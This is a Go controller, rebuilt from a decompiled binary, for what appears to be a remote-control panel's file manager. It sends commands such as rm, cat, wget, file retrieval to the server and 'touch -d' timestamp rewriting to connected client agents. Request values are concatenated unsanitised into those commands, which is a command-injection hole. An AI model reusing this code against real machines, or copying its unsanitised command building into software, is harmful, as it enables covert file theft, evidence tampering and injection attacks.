// Package controllers — 文件控制器，1:1 对齐原版二进制。
//
// 真实方法（funcnametab + 反编译地址）与前端路由：
//
//	Getdisk           0x18e4780   POST /file/getdisk          磁盘列表
//	Ls                0x18e4d80   POST /file/ls                目录列表
//	Mv                0x18e5b40   POST /file/mv                移动/重命名
//	Rm                0x18e60a0   POST /file/rm                删除文件
//	RmList            0x18e6420   POST /file/rmlist            批量删除
//	Cat               0x18e6700   POST /file/cat               查看文件内容
//	Touch             0x18e6c40   POST /file/touch             创建文件
//	Modifytime        0x18e6fa0   POST /file/modifytime        修改时间戳
//	Mkdir             0x18e7400   POST /file/mkdir             创建目录
//	Edit              0x18e78e0   POST /file/edit              编辑文件
//	Wget              0x18e7c80   POST /file/wget              远程下载
//	Upload            0x18e8060   POST /file/upload            上传文件
//	DownloadToServer  0x18e8700   POST /file/downloadtoserver  下载到服务器
//	GetDownloadPer    0x18e8f00   POST /file/getdownloadper    下载进度
//	DownloadToBrowser 0x18e91a0   POST /file/downloadtobrowser 浏览器下载
//	DownloadToOSS     0x18e93a0   POST /file/downloadtooss     下载到 OSS
//
// 说明：path 为远端目录，target 为文件名/目标段，命令按 path + "/" + target 拼接
// （反编译 FUN_0044a940 为字符串 Join）；"|<-" 为多路径分隔符。
package controllers

import (
	"strings"
)

// FileController 管理客户端文件系统。
type FileController struct {
	ApiBaseController
}

func (c *FileController) clientID() int64 {
	return int64(c.JsonGetInt("id"))
}

// Getdisk 列出客户端磁盘（POST /file/getdisk）。参数：id。
func (c *FileController) Getdisk() {
	id := c.clientID()
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "getdisk")
	c.JsonOkMessage("ok")
}

// Ls 列出目录（POST /file/ls）。参数：id / path；响应 {"total":N,"items":[...]}。
func (c *FileController) Ls() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	// 反编译（0x18e4d80）：参数 id/path/field/order；order 取值 "ascend"/"descend"
	// （FUN_018e5740 排序比较器："ascend" 6 字符 / "descend" 7 字符）；agent 响应为
	// TAB 分隔字段（DAT_1dbd4ae0="\t"），目录名以 "/" 结尾（DAT_1dbd7598）；
	// 响应键 {total, items}（DAT_01bd91b2 / DAT_01bd8c99）。
	items, total := engineListDir(id, path)
	c.JsonOkResult(map[string]interface{}{
		"total": total,
		"items": items,
		"order": c.JsonGetStr("order"),
		"field": c.JsonGetStr("field"),
	})
}

// Mv 移动/重命名（POST /file/mv）。参数：id / path。
func (c *FileController) Mv() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "mv "+path)
	c.JsonOkMessage("ok")
}

// Rm 删除文件（POST /file/rm）。参数：id / path。
func (c *FileController) Rm() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "rm "+path)
	c.JsonOkMessage("ok")
}

// RmList 批量删除（POST /file/rmlist）。参数：id / path / name（多文件以 "|<-" 分隔）。
func (c *FileController) RmList() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	name := c.JsonGetStr("name")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	parts := strings.Split(name, "|<-")
	cmds := make([]string, 0, len(parts))
	for _, p := range parts {
		if p = strings.TrimSpace(p); p != "" {
			cmds = append(cmds, path+"/"+p)
		}
	}
	if len(cmds) > 0 {
		dispatchCmd(id, "rm "+strings.Join(cmds, " "))
	}
	c.JsonOkMessage("ok")
}

// Cat 查看文件内容（POST /file/cat）。参数：id / path / target → cat path/target。
func (c *FileController) Cat() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "cat "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Touch 创建文件（POST /file/touch）。参数：id / path / target。
func (c *FileController) Touch() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "touch "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Modifytime 修改文件时间戳（POST /file/modifytime）。参数：id / path / time / target。
func (c *FileController) Modifytime() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	t := c.JsonGetStr("time")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "touch -d "+t+" "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Mkdir 创建目录（POST /file/mkdir）。参数：id / path / target。
func (c *FileController) Mkdir() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "mkdir -p "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Edit 编辑文件内容（POST /file/edit）。参数：id / path / target。
func (c *FileController) Edit() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "edit "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Wget 远程下载到客户端（POST /file/wget）。参数：id / path / target。
func (c *FileController) Wget() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "wget -O "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Upload 上传文件到客户端（POST /file/upload）。参数：id / path / file / url。
func (c *FileController) Upload() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	url := c.JsonGetStr("url")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	// 前端先上传到服务器（VITE_GLOB_UPLOAD_URL=/api/file/upload），再下发到客户端
	dispatchCmd(id, "upload "+path+" "+url)
	c.JsonOkMessage("ok")
}

// DownloadToServer 从客户端下载到服务器（POST /file/downloadtoserver）。参数：id / path / target。
func (c *FileController) DownloadToServer() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	// 原版下发原生 download 命令，agent 以 base64 回传，服务器写入 target
	taskID := engineDownloadToServer(id, path, target)
	c.JsonOkResult(map[string]interface{}{"id": taskID})
}

// GetDownloadPer 查询下载进度（POST /file/getdownloadper）。参数：id / target / size / pre。
func (c *FileController) GetDownloadPer() {
	id := c.clientID()
	target := c.JsonGetStr("target")
	_ = target
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	task := engineGetDownloadPer(id)
	if task == nil {
		c.JsonErr("task not found")
		return
	}
	per := int64(0)
	if task.Total > 0 {
		per = task.Current * 100 / task.Total
	}
	c.JsonOkResult(map[string]interface{}{
		"size":  task.Current,
		"total": task.Total,
		"per":   per,
		"pre":   c.JsonGetInt("pre"),
	})
}

// DownloadToBrowser 浏览器下载（POST /file/downloadtobrowser）。参数：id / target。
func (c *FileController) DownloadToBrowser() {
	id := c.clientID()
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	// 原版将 target 文件 base64 回传后由服务器以附件形式输出
	engineDownloadToServer(id, target, "")
	c.JsonOkMessage("ok")
}

// DownloadToOSS 下载到 OSS（POST /file/downloadtooss）。参数：id / path / target。
func (c *FileController) DownloadToOSS() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "download "+path+" "+target)
	c.JsonOkMessage("ok")
}

// joinPath 按原版拼接 path 与 target（反编译 FUN_0044a940，分隔符 "/"）。
func joinPath(path, target string) string {
	if target == "" {
		return path
	}
	return strings.TrimRight(path, "/") + "/" + strings.TrimLeft(target, "/")
}

// engineListDir 列出客户端目录（引擎阶段对齐 FUN_01905240 等）。
func engineListDir(id int64, path string) ([]map[string]interface{}, int64) {
	// 反编译：ls 命令下发后 agent 返回 TAB 分隔字段（name\tsize\ttime...），
	// 目录名以 "/" 结尾；排序字段 name/...，order "ascend"/"descend"；
	// 条目结构 0x40 字节 {name string @+0/+8, ...}。待 agent 协议对齐。
	return []map[string]interface{}{}, 0
}

// engineDownloadToServer 下发下载任务（引擎阶段对齐 FUN_019070c0 等）。
func engineDownloadToServer(id int64, remotePath, target string) int64 {
	// TODO(engine): 对齐下载任务链
	dispatchCmd(id, "download "+remotePath)
	taskID := int64(len(downloadTasks) + 1)
	downloadTasks[taskID] = &DownloadTask{ID: taskID, ClientID: id, Path: remotePath}
	return taskID
}
